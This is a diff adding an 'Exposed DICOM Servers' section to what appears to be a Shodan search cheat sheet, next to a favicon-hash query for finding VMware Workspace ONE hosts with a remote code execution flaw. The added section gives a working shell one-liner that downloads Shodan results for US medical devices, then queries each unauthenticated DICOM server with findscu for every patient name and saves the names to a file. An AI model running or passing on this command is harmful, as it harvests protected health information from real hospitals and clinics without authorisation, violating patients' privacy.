@@ -144,3 +144,10 @@ VMware Workspace ONE Access and Identity Manager contain a remote code execution
 ```
 http.favicon.hash:-1250474341
 ```
+## Exposed DICOM Servers
+
+Count patient names in US exposed DICOM medical servers with no authentication
+
+```
+$ shodan download search "tag:medical" "country:us"; shodan parse --fields ip_str search.json.gz > usa_dicom_ip ; for i in `cat usa_dicom_ip` ; do echo "///// Now connecting to $i ////" ; findscu -v -to 1 -P -k PatientName="*" $i 104 >> us_dicom_patient_names; wc -l us_dicom_patient_names ; done
+```
